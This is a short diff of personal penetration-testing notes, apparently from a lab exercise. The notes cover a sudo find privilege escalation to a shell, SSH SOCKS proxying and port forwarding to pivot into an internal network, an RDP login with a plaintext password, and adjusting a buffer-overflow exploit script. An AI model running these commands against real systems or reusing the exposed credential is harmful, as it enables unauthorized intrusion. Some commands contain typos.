@@ -146,5 +146,15 @@ sudo -l
 
 escalate privs 
 sudo find . -exec /bin/sh \; -quit
+ssh -S /tmp/gray gray -0 cancel -D9050
+ssh -S /tmp/aaron Aaron -O forward -D9050
 
-192.168.28.190
+192.168.28.179:22,139,445, 3389(xfreerdp,rdp), 9999 
+proxychains nc 192.168.29.179 9999
+
+ssh -S /tmp /aaron aaron -O forward -L 1440:192.168.28.29:3389
+ssh -S /tmp /aaron aaron -O forward -L 1441:192.168.28.29:9999
+anotherpassword4THEages
+xfreerdp /v:192.168.28.179:1440 /u:Lroth /p:anotherpassword4THEages /size:1920x1000 +clipboard
+vim secureserverBuffo.py change port to 1440
+
